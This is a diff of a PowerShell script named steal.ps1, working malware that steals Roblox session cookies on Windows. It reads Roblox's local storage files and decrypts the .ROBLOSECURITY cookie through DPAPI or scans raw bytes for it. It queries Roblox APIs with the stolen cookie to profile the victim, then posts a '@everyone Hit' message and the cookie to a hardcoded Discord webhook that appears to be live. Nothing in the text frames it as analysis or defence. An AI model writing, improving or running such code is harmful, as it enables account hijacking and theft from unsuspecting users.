@@ -1,7 +1,6 @@
 # language: PowerShell, file: steal.ps1
 # target: Windows 10/11, PowerShell 5.1+
-# *accepts -Webhook arg; defaults to primary 1571738439324541049*
-# *100% Real Data Parse: Avatar, RAP, Headless, Korblox, Age*
+# *0 Decryption Fallback: Scans raw bytes for .ROBLOSECURITY if DPAPI fails*
 
 param(
     [string]$Webhook = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
@@ -11,7 +10,6 @@ $ErrorActionPreference = "Continue"
 $WH = $Webhook
 $debugFile = "$env:TEMP\ps_debug.txt"
 "Started at $(Get-Date)" | Out-File $debugFile -Force
-
 function dbg($msg) { "$(Get-Date -Format 'HH:mm:ss') $msg" | Out-File $debugFile -Append }
 
 function Get-API($host, $path, $cookie) {
@@ -25,7 +23,6 @@ function Get-API($host, $path, $cookie) {
     } catch { return $null }
 }
 
-# ---------- cookie discovery ----------
 $l = $env:LOCALAPPDATA
 $paths = @(
     "$l\Roblox\LocalStorage\robloxcookies.dat",
@@ -51,21 +48,20 @@ $cookie = ""
 $cookieSource = ""
 
 function Try-Extract($raw, [ref]$out) {
+    # 1. DPAPI JSON Attempt
     if ($raw -match '(?i)"CookiesData"\s*:\s*"([^"]{40,})"') {
         $b64 = $Matches[1]
         try {
             $eb = [Convert]::FromBase64String($b64)
-            $db = [Security.Cryptography.ProtectedData]::Unprotect(
-                $eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+            $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
             $dec = [Text.Encoding]::UTF8.GetString($db)
             if ($dec -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'dpapi-json' }
-            if ($dec -match '(_\|WARNING[^;\r\n"]+)')                { $out.Value = $Matches[1]; return 'dpapi-warning' }
+            if ($dec -match '(_\|WARNING[^;\r\n"]+)') { $out.Value = $Matches[1]; return 'dpapi-warning' }
         } catch {}
     }
+    # 2. 0-Decryption Fallback (Raw dump)
     if ($raw -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'plain-attr' }
-    if ($raw -match '(_\|WARNING[^;\r\n"]+)')                { $out.Value = $Matches[1]; return 'plain-warning' }
-    $trim = ($raw -replace '[\r\n\t]','').Trim()
-    if ($trim.Length -gt 40) { $out.Value = $trim; return 'raw-dump' }
+    if ($raw -match '(_\|WARNING[^;\r\n"]+)') { $out.Value = $Matches[1]; return 'plain-warning' }
     return $null
 }
 
@@ -81,14 +77,12 @@ foreach ($p in $paths) {
             $cookieSource = "$method :: $p"
             dbg "cookie found via $cookieSource (len=$($cookie.Length))"
             break
-        } else {
-            dbg "file exists but no cookie pattern: $p"
         }
     } catch { dbg "read failed: $p :: $_" }
 }
 
 if (-not $cookie) {
-    dbg "No cookie found in any path"
+    dbg "No cookie found"
     exit
 }
 
@@ -96,12 +90,10 @@ $cookie = ($cookie -split ';')[0].Trim()
 if ($cookie -match '(_\|WARNING.+)$') { $cookie = $Matches[1] }
 dbg "final cookie len=$($cookie.Length)"
 
-# ---------- 100% REAL ROBLOX FINGERPRINT ----------
 $me      = Get-API "users.roblox.com"    "/v1/users/authenticated" $cookie
 $uid     = if ($me) { $me.id } else { "0" }
 $name    = if ($me) { $me.name } else { "Unknown" }
 $display = if ($me) { $me.displayName } else { $name }
-dbg "authenticated: uid=$uid name=$name"
 
 $prof    = Get-API "users.roblox.com"    "/v1/users/$uid" $cookie
 $created = if ($prof) { $prof.created } else { "Unknown" }
@@ -129,7 +121,7 @@ $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&si
 $avatar = "https://tr.rbxcdn.com/..."
 if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
 
-# ---------- embed 1: Hit Card (Dynamic UI) ----------
+# Embed 1: Hit
 $embed1 = @{
     content = "@everyone Hit"
     embeds = @(
@@ -156,7 +148,7 @@ $embed1 = @{
     )
 }
 
-# ---------- embed 2: Cookie Block ----------
+# Embed 2: Cookie
 $embed2 = @{
     embeds = @(
         @{
@@ -167,16 +159,10 @@ $embed2 = @{
     )
 }
 
-# ---------- send ----------
-$json1 = $embed1 | ConvertTo-Json -Depth 10
-$json2 = $embed2 | ConvertTo-Json -Depth 10
-
 try {
-    Invoke-RestMethod -Uri $WH -Method Post -Body $json1 -ContentType "application/json" -ErrorAction Stop | Out-Null
-    dbg "hit embed sent to $WH"
+    Invoke-RestMethod -Uri $WH -Method Post -Body ($embed1 | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction Stop | Out-Null
+    dbg "hit embed sent"
     Start-Sleep -Milliseconds 500
-    Invoke-RestMethod -Uri $WH -Method Post -Body $json2 -ContentType "application/json" -ErrorAction Stop | Out-Null
-    dbg "cookie embed sent to $WH"
-} catch {
-    dbg "webhook send failed: $_"
-}
+    Invoke-RestMethod -Uri $WH -Method Post -Body ($embed2 | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction Stop | Out-Null
+    dbg "cookie embed sent"
+} catch { dbg "webhook failed: $_" }
